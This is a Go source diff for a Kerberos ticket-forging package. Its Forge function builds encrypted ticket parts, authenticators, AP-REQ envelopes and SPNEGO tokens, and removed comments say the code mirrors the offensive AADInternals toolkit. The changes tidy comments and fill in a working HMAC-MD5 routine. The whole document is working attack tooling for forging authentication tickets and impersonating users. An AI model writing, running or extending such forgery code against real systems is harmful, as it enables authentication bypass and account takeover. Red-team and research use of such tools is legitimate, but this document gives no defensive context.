@@ -3,7 +3,9 @@
 package ticket
 
 import (
+	"crypto/hmac"
 	cryptorand "crypto/rand"
+	"crypto/md5" //nolint:gosec
 	"fmt"
 	"time"
 
@@ -79,12 +81,9 @@ func Forge(params *ForgeParams) (*ForgedTicket, error) {
 	return &ForgedTicket{SPNEGOBytes: spnego}, nil
 }
 
-// ============================================================
-// EncTicketPart DER construction (matches AADInternals lines 527-639)
-// ============================================================
-
+// buildTicketBodyDER constructs the EncTicketPart ASN.1 structure.
 func buildTicketBodyDER(authTime, endTime, renewTime time.Time, sessKey []byte, p *ForgeParams) []byte {
-	flags := []byte{0x40, 0xA1, 0x00, 0x00}  // 4 bytes, unused bits added by derBitString
+	flags := []byte{0x40, 0xA1, 0x00, 0x00}
 	authData := buildTicketAuthDataDER(p)
 
 	return der(
@@ -166,10 +165,7 @@ func tokenRestrictionData(machineID []byte) []byte {
 	return b
 }
 
-// ============================================================
-// Authenticator DER construction (matches AADInternals lines 643-782)
-// ============================================================
-
+// buildAuthenticatorDER constructs the authenticator ASN.1 structure.
 func buildAuthenticatorDER(ctime time.Time, sessKey, seqNumber, machineID, kerbLocal2 []byte, p *ForgeParams) []byte {
 	subKeyType := byte(23) // RC4
 	subKeySize := 16
@@ -271,10 +267,7 @@ func authTokenRestrictionData(machineID []byte) []byte {
 	return b
 }
 
-// ============================================================
-// KRB_AP_REQ DER construction (matches AADInternals lines 808-868)
-// ============================================================
-
+// buildAPREQDER constructs the AP-REQ ticket envelope.
 func buildAPREQDER(encTicket, encAuth []byte, p *ForgeParams) []byte {
 	return der(
 		0x6E, // APPLICATION 14
@@ -314,10 +307,7 @@ func buildAPREQDER(encTicket, encAuth []byte, p *ForgeParams) []byte {
 	)
 }
 
-// ============================================================
-// SPNEGO wrapping (matches AADInternals lines 786-876)
-// ============================================================
-
+// buildSPNEGO wraps the AP-REQ in SPNEGO GSS-API tokens.
 func buildSPNEGO(apreq []byte) []byte {
 	// Build mechToken: GSS-API InitialContextToken wrapping KRB_AP_REQ
 	mechToken := der(
@@ -502,8 +492,9 @@ func encryptRC4(key, data []byte, usage int) []byte {
 }
 
 func hmacMD5(key, data []byte) []byte {
-	// Uses crypto/hmac + crypto/md5
-	return _hmacMD5(key, data)
+	m := hmac.New(md5.New, key)
+	m.Write(data)
+	return m.Sum(nil)
 }
 
 func rc4Crypt(key, data []byte) []byte {
@@ -527,10 +518,6 @@ func rc4Crypt(key, data []byte) []byte {
 	return result
 }
 
-// ============================================================
-// Helpers
-// ============================================================
-
 func randomBytes(n int) []byte {
 	b := make([]byte, n)
 	cryptorand.Read(b)
@@ -544,7 +531,3 @@ func utf16LE(s string) []byte {
 	}
 	return b
 }
-
-// Separate stubs for crypto to avoid import issues
-// (implementations in crypto_rc4.go)
-var _hmacMD5 func(key, data []byte) []byte
